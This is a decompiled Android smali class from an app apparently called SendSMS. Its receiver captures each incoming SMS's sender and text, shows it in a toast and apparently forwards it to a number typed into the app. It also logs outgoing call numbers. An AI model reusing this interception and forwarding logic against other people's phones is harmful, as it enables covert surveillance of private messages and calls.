.class final Lcom/gambler/SendSMS/f;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field private synthetic a:Lcom/gambler/SendSMS/MainActivity;


# direct methods
.method constructor <init>(Lcom/gambler/SendSMS/MainActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/gambler/SendSMS/f;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 6

    const/4 v5, 0x0

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    const-string v2, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    if-eqz v1, :cond_0

    const-string v0, "pdus"

    invoke-virtual {v1, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    array-length v1, v0

    new-array v3, v1, [Landroid/telephony/gsm/SmsMessage;

    move v4, v5

    :goto_0
    array-length v1, v0

    if-lt v4, v1, :cond_1

    array-length v0, v3

    move v1, v5

    :goto_1
    if-lt v1, v0, :cond_2

    iget-object v0, p0, Lcom/gambler/SendSMS/f;->a:Lcom/gambler/SendSMS/MainActivity;

    const/4 v1, 0x1

    invoke-static {v0, v2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    iget-object v0, p0, Lcom/gambler/SendSMS/f;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v1, p0, Lcom/gambler/SendSMS/f;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v1}, Lcom/gambler/SendSMS/MainActivity;->a(Lcom/gambler/SendSMS/MainActivity;)Landroid/widget/EditText;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-interface {v1}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/gambler/SendSMS/MainActivity;->a(Lcom/gambler/SendSMS/MainActivity;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    :goto_2
    return-void

    :cond_1
    aget-object v1, v0, v4

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v1

    aput-object v1, v3, v4

    add-int/lit8 v1, v4, 0x1

    move v4, v1

    goto :goto_0

    :cond_2
    aget-object v4, v3, v1

    const-string v5, "From:"

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Landroid/telephony/gsm/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "\nMessage:"

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Landroid/telephony/gsm/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_3
    const-string v2, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/gambler/SendSMS/f;->a:Lcom/gambler/SendSMS/MainActivity;

    const-string v2, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/gambler/SendSMS/MainActivity;->a(Lcom/gambler/SendSMS/MainActivity;Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "mOutGoingNum == "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/gambler/SendSMS/f;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v1}, Lcom/gambler/SendSMS/MainActivity;->b(Lcom/gambler/SendSMS/MainActivity;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    goto :goto_2
.end method
